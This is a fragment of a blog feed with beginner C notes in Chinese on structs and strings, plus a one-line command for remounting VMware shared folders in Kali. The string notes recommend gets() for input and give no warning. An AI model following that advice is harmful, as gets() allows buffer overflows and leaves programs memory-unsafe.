        <content type="html"><![CDATA[<h1 id="C语言学习笔记1-2"><a href="#C语言学习笔记1-2" class="headerlink" title="C语言学习笔记1.2"></a>C语言学习笔记1.2</h1><h2 id="C结构体"><a href="#C结构体" class="headerlink" title="C结构体"></a>C结构体</h2><h3 id="C语言结构体基本知识"><a href="#C语言结构体基本知识" class="headerlink" title="C语言结构体基本知识"></a>C语言结构体基本知识</h3><p>C 数组允许定义可存储相同类型数据项的变量，<strong>结构</strong>是 C 编程中另一种用户自定义的可用的数据类型，它允许存储不同类型的数据项。</p><span id="more"></span><h3 id="结构体定义"><a href="#结构体定义" class="headerlink" title="结构体定义"></a>结构体定义</h3><p>为了定义结构，必须使用 <strong>struct</strong> 语句。struct语句结构如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tag</span><span class="token punctuation">&#123;</span>    member<span class="token operator">-</span>list<span class="token punctuation">;</span>    member<span class="token operator">-</span>list<span class="token punctuation">;</span>    member<span class="token operator">-</span>list<span class="token punctuation">;</span>    member<span class="token operator">-</span>list<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span> variable<span class="token operator">-</span>list <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>tag</strong> 是结构体标签。</p><p><strong>member-list</strong> 是标准的变量定义，比如 int i; 或者 float f，或者其他有效的变量定义。</p><p><strong>variable-list</strong> 结构变量，定义在结构的末尾，最后一个分号之前，可以指定一个或多个结构变量。</p><p>例如下面的定义:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">books</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> author<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> subject<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> book_id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">books</span> book1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>等价于：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">books</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> author<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> subject<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> book_id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> book1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在一般情况下，<strong>tag、member-list、variable-list</strong> 这 3 部分至少要出现 2 个。</p><h3 id="结构体变量的初始化"><a href="#结构体变量的初始化" class="headerlink" title="结构体变量的初始化"></a>结构体变量的初始化</h3><p>和其它类型变量一样，对结构体变量可以在定义时指定初始值。</p><p>例如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">books</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> author<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> subject<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> book_id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> book1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"a book on c"</span><span class="token punctuation">,</span><span class="token string">"mark0519"</span><span class="token punctuation">,</span><span class="token string">"programming"</span><span class="token punctuation">,</span><span class="token number">13456</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">books</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> author<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> subject<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> book_id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">books</span> book1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"a book on c"</span><span class="token punctuation">,</span><span class="token string">"mark0519"</span><span class="token punctuation">,</span><span class="token string">"programming"</span><span class="token punctuation">,</span><span class="token number">13456</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再或者</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">books</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> author<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> subject<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> book_id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">books</span> book1<span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>book1<span class="token punctuation">.</span>title<span class="token punctuation">,</span><span class="token string">"a book on c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//book1.title中的“.”为“成员访问运算符”，用于访问结构的成员</span><span class="token function">strcpy</span><span class="token punctuation">(</span>book1<span class="token punctuation">.</span>author<span class="token punctuation">,</span><span class="token string">"mark0519"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>book1<span class="token punctuation">.</span>subject<span class="token punctuation">,</span><span class="token string">"programming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>book1<span class="token punctuation">.</span>book_id<span class="token operator">=</span><span class="token number">123456</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="访问结构成员"><a href="#访问结构成员" class="headerlink" title="访问结构成员"></a>访问结构成员</h3><p>上面的最后一个例子中的 book1.title 中的 “.” 为 “成员访问运算符” ，用于访问结构的成员。</p><p>下面的例子用于理解该运算符：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span> <span class="token keyword">struct</span> <span class="token class-name">Books</span><span class="token punctuation">&#123;</span>   <span class="token keyword">char</span>  title<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">char</span>  author<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">char</span>  subject<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">int</span>   book_id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">struct</span> <span class="token class-name">Books</span> Book1<span class="token punctuation">;</span>        <span class="token comment">/* 声明 Book1，类型为 Books */</span>   <span class="token keyword">struct</span> <span class="token class-name">Books</span> Book2<span class="token punctuation">;</span>        <span class="token comment">/* 声明 Book2，类型为 Books */</span>    <span class="token comment">/* Book1 详述 */</span>   <span class="token function">strcpy</span><span class="token punctuation">(</span> Book1<span class="token punctuation">.</span>title<span class="token punctuation">,</span> <span class="token string">"C Programming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">strcpy</span><span class="token punctuation">(</span> Book1<span class="token punctuation">.</span>author<span class="token punctuation">,</span> <span class="token string">"Nuha Ali"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span> Book1<span class="token punctuation">.</span>subject<span class="token punctuation">,</span> <span class="token string">"C Programming Tutorial"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   Book1<span class="token punctuation">.</span>book_id <span class="token operator">=</span> <span class="token number">6495407</span><span class="token punctuation">;</span>    <span class="token comment">/* Book2 详述 */</span>   <span class="token function">strcpy</span><span class="token punctuation">(</span> Book2<span class="token punctuation">.</span>title<span class="token punctuation">,</span> <span class="token string">"Telecom Billing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">strcpy</span><span class="token punctuation">(</span> Book2<span class="token punctuation">.</span>author<span class="token punctuation">,</span> <span class="token string">"Zara Ali"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">strcpy</span><span class="token punctuation">(</span> Book2<span class="token punctuation">.</span>subject<span class="token punctuation">,</span> <span class="token string">"Telecom Billing Tutorial"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   Book2<span class="token punctuation">.</span>book_id <span class="token operator">=</span> <span class="token number">6495700</span><span class="token punctuation">;</span>    <span class="token comment">/* 输出 Book1 信息 */</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 1 title : %s\n"</span><span class="token punctuation">,</span> Book1<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 1 author : %s\n"</span><span class="token punctuation">,</span> Book1<span class="token punctuation">.</span>author<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 1 subject : %s\n"</span><span class="token punctuation">,</span> Book1<span class="token punctuation">.</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 1 book_id : %d\n"</span><span class="token punctuation">,</span> Book1<span class="token punctuation">.</span>book_id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* 输出 Book2 信息 */</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 2 title : %s\n"</span><span class="token punctuation">,</span> Book2<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 2 author : %s\n"</span><span class="token punctuation">,</span> Book2<span class="token punctuation">.</span>author<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 2 subject : %s\n"</span><span class="token punctuation">,</span> Book2<span class="token punctuation">.</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Book 2 book_id : %d\n"</span><span class="token punctuation">,</span> Book2<span class="token punctuation">.</span>book_id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">Book <span class="token number">1</span> title <span class="token operator">:</span> C ProgrammingBook <span class="token number">1</span> author <span class="token operator">:</span> Nuha AliBook <span class="token number">1</span> subject <span class="token operator">:</span> C Programming TutorialBook <span class="token number">1</span> book_id <span class="token operator">:</span> <span class="token number">6495407</span>Book <span class="token number">2</span> title <span class="token operator">:</span> Telecom BillingBook <span class="token number">2</span> author <span class="token operator">:</span> Zara AliBook <span class="token number">2</span> subject <span class="token operator">:</span> Telecom Billing TutorialBook <span class="token number">2</span> book_id <span class="token operator">:</span> <span class="token number">6495700</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="结构作为函数参数"><a href="#结构作为函数参数" class="headerlink" title="结构作为函数参数"></a>结构作为函数参数</h3><p>可以把结构作为函数参数，传参方式与其他类型的变量或指针类似。可以使用上面实例中的方式来访问结构变量：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">printfbook</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">books</span> book<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">books</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> author<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> subject<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> book_id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> book1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"learn c"</span><span class="token punctuation">,</span><span class="token string">"mark_"</span><span class="token punctuation">,</span><span class="token string">"programming"</span><span class="token punctuation">,</span><span class="token number">654321</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">books</span> book2<span class="token punctuation">;</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span>book2<span class="token punctuation">.</span>title<span class="token punctuation">,</span><span class="token string">"a book on c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">strcpy</span><span class="token punctuation">(</span>book2<span class="token punctuation">.</span>author<span class="token punctuation">,</span><span class="token string">"mark0519"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>book2<span class="token punctuation">.</span>subject<span class="token punctuation">,</span><span class="token string">"programming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>book2<span class="token punctuation">.</span>book_id<span class="token operator">=</span><span class="token number">123456</span><span class="token punctuation">;</span>        <span class="token function">printfbook</span><span class="token punctuation">(</span>book1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printfbook</span><span class="token punctuation">(</span>book2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">printfbook</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">books</span> book<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\ntitle=%s\n"</span><span class="token punctuation">,</span>book<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"author=%s\n"</span><span class="token punctuation">,</span>book<span class="token punctuation">.</span>author<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"subject=%s\n"</span><span class="token punctuation">,</span>book<span class="token punctuation">.</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"book_id=%d\n"</span><span class="token punctuation">,</span>book<span class="token punctuation">.</span>book_id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">title<span class="token operator">=</span>learn cauthor<span class="token operator">=</span>mark_subject<span class="token operator">=</span>programmingbook_id<span class="token operator">=</span><span class="token number">654321</span>title<span class="token operator">=</span>a book on cauthor<span class="token operator">=</span>mark0519subject<span class="token operator">=</span>programmingbook_id<span class="token operator">=</span><span class="token number">123456</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="指针和位域"><a href="#指针和位域" class="headerlink" title="指针和位域"></a>指针和位域</h3><p>我还没整明白。。。</p><p>先空着。。。</p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> str </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机重启后找不到共享文件夹的方法</title>
      <link href="//post/find-share-folder-in-kali.html"/>
      <url>//post/find-share-folder-in-kali.html</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟机重启后找不到共享文件夹的方法"><a href="#虚拟机重启后找不到共享文件夹的方法" class="headerlink" title="虚拟机重启后找不到共享文件夹的方法"></a>虚拟机重启后找不到共享文件夹的方法</h1><p>在root权限下输入以下命令：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">vmhgfs<span class="token operator">-</span>fuse <span class="token operator">.</span>host<span class="token punctuation">:</span><span class="token operator">/</span> <span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言学习笔记——C字符串</title>
      <link href="//post/c-learn.html"/>
      <url>//post/c-learn.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习笔记1-1"><a href="#C语言学习笔记1-1" class="headerlink" title="C语言学习笔记1.1"></a>C语言学习笔记1.1</h1><h2 id="C字符串"><a href="#C字符串" class="headerlink" title="C字符串"></a>C字符串</h2><h3 id="c字符串基本知识"><a href="#c字符串基本知识" class="headerlink" title="c字符串基本知识"></a>c字符串基本知识</h3><p>在C语言中，没有字符串变量，C语言保存字符串采用的是字符数组的形式。</p><span id="more"></span><p>C语言的字符串以null字符’\0’结束，例如字符串“HELLO”的定义：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> hello<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token char">'H'</span><span class="token punctuation">,</span><span class="token char">'E'</span><span class="token punctuation">,</span><span class="token char">'L'</span><span class="token punctuation">,</span><span class="token char">'L'</span><span class="token punctuation">,</span><span class="token char">'O'</span><span class="token punctuation">,</span><span class="token char">'\0'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际上，根据字符初始化规则，字符串hello只需要写出这样：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> hello<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"HELLO"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以下是定义的字符串内存表示:</p><table><thead><tr><th align="center">Index</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th align="left">5</th></tr></thead><tbody><tr><td align="center"><strong>Variable</strong></td><td>H</td><td>E</td><td>L</td><td>L</td><td>O</td><td align="left">\0</td></tr><tr><td align="center"><strong>Address</strong></td><td>0x23451</td><td>0x23452</td><td>0x23453</td><td>0x23454</td><td>0x23455</td><td align="left">0x23456</td></tr></tbody></table><p>其实，不需要把 <em>null</em> 字符放在字符串常量的末尾。C 编译器会在初始化数组时，自动把 ‘\0’ 放在字符串的末尾，且在输出时null字符不可见。例如运行代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> m<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token char">'H'</span><span class="token punctuation">,</span><span class="token char">'E'</span><span class="token punctuation">,</span><span class="token char">'L'</span><span class="token punctuation">,</span><span class="token char">'L'</span><span class="token punctuation">,</span><span class="token char">'O'</span><span class="token punctuation">,</span><span class="token char">'\0'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译之后，输出结果为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">HELLO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里特别提到，当想完整输出某个字符数组m[8]时，可直接写为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//省略m[8]中的[8]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中%s代表以字符串形式输出，而C语言中也有%c表示单个字符的输出。 </p><h3 id="C语言中字符串输入"><a href="#C语言中字符串输入" class="headerlink" title="C语言中字符串输入"></a>C语言中字符串输入</h3><p>一般用：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意！</strong>在使用scnaf(“%s”,buf);时，输入的结尾一般为回车或者空格，所以scanf(“%s”,buf)没法在字符串中输入空格，而第一种使用gets()函数可以，但是，可以这样改进：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%[^\n]"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即可输入空格在字符串中。</p><p>具体原理如下：</p><p><strong><code>%[]</code>可以用来限制输入的内容，比如<code>%[0-9]</code>就表示只读入‘0’-‘9’之间的数字，<code>%[a-z]</code>表示只读入‘a’到‘z’之间的字母。我们这里的<code>%[^\n]</code>中的<code>^</code>就表示“非”的意思,<code>\n</code>就是我们平时所说的回车符，所以<code>%[^\n]</code>这个符号就是表示只读取 不是<code>\n</code>的字符。</strong></p><p>但是用这种方式输入多组字符串时仍会出现问题，以为例如<code>%[^\n]</code>将会待接收到回车时停止，在数组buf中不含回车，但回车\n仍在缓冲区中，如果接下来仍有输入字符串，将会接收到这个\n，一般可以只用getchar()处理，如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> buf1<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%[^\n]"</span><span class="token punctuation">,</span>buf1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%[^\n]"</span><span class="token punctuation">,</span>buf2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="C语言中操作字符串的部分函数（需要使用-lt-string-h-gt-头文件）"><a href="#C语言中操作字符串的部分函数（需要使用-lt-string-h-gt-头文件）" class="headerlink" title="C语言中操作字符串的部分函数（需要使用&lt;string.h&gt;头文件）"></a>C语言中操作字符串的部分函数（需要使用&lt;string.h&gt;头文件）</h3><table><thead><tr><th align="left">序号</th><th>函数</th><th>目的</th></tr></thead><tbody><tr><td align="left">1</td><td><code>strcpy(s1,s2);</code></td><td>复制字符串s2的内容到s1</td></tr><tr><td align="left">2</td><td><code>strcat(s1,s2);</code></td><td>连接字符串s2到s1的结尾处</td></tr><tr><td align="left">3</td><td><code>strlen(s1);</code></td><td>返回字符串s1的长度,不含null符</td></tr><tr><td align="left">4</td><td><code>strcmp(s1,s2);</code></td><td>比较字符串s1和s2的大小</td></tr><tr><td align="left">5</td><td><code>strchr(s1,ch);</code></td><td>返回一个指向s1中字符ch<strong>第一次</strong>出现的位置的指针,找不到返回NULL</td></tr><tr><td align="left">6</td><td><code>strrchr(s1,ch);</code></td><td>返回一个指向s1中字符ch<strong>最后一次</strong>出现的位置的指针,找不到返回NULL</td></tr><tr><td align="left">7</td><td><code>strstr(s1,s2);</code></td><td>返回一个指向s1中字符串s2<strong>第一次</strong>出现的位置的指针,找不到返回NULL</td></tr></tbody></table><blockquote><p>注意：strcmp(s1,s2)函数有两个参数，即要比较的两个字符串。strcmp()函数对两个字符串进行大小写敏感的(case-sensitiVe)和字典式的(lexicographic)比较，并返回下列值之一：</p><table><thead><tr><th>返回值</th><th>意义</th></tr></thead><tbody><tr><td>&lt;0</td><td>字符串s1小于字符串s2</td></tr><tr><td>0</td><td>字符串s1等于字符串s2</td></tr><tr><td>&gt;0</td><td>字符串s1大于字符串s2</td></tr></tbody></table><p>具体用法作用见实例2</p></blockquote><p>下面是一些运用实例：</p><h4 id="实例1（-strcpy-，strcat-，strlen-）"><a href="#实例1（-strcpy-，strcat-，strlen-）" class="headerlink" title="实例1（ strcpy()，strcat()，strlen() ）"></a>实例1（ strcpy()，strcat()，strlen() ）</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"hello_"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token 